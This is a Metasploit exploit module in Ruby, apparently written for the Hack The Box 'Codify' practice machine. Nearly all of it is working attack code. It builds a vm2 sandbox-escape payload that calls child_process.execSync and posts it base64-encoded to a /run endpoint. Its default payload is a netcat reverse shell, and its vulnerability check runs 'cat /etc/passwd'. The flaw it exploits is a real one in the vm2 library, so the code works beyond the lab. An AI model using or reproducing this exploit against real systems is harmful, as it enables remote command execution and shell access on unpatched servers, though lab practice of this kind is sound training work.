##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Hackthebox Codify',
        'Description' => %q{
          This exploit module is used to gain foothold access to 
          Hackthebox's Codify machine.
        },
        'License' => MSF_LICENSE,
        'Author' => ['ClutchReboot'],
        'References' => [
          [ 'Hackthebox', 'https://www.hackthebox.com/machines/codify' ],
          [ 'URL', 'https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m' ]
        ],
        'Payload' => {
          'BadChars' => "\x00"
        },
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat'
              }
            }
          ]
        ],
        'DisclosureDate' => '2023-11-04',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def create_vm2_payload(cmd)
    return "err = {};
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };
      
    const proxiedErr = new Proxy(err, handler);
    try {
        throw proxiedErr;
    } catch ({constructor: c}) {
        c.constructor('return process')().mainModule.require('child_process').execSync(\"#{cmd}\");
    }"
  end

  def execute_command(cmd, _opts = {})
    return send_request_cgi({
      'method' => 'POST',
      'uri' => '/run',
      'ctype' => 'application/json',
      'data' => JSON.generate({
        'code': Rex::Text.encode_base64(create_vm2_payload(cmd))
      })
    })
  end

  def check
    res = execute_command('cat /etc/passwd')
    if res && res.code == 200
      CheckCode::Vulnerable
    end
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
      when :unix_cmd
        execute_command(payload.encoded)
      end
  end
end
  
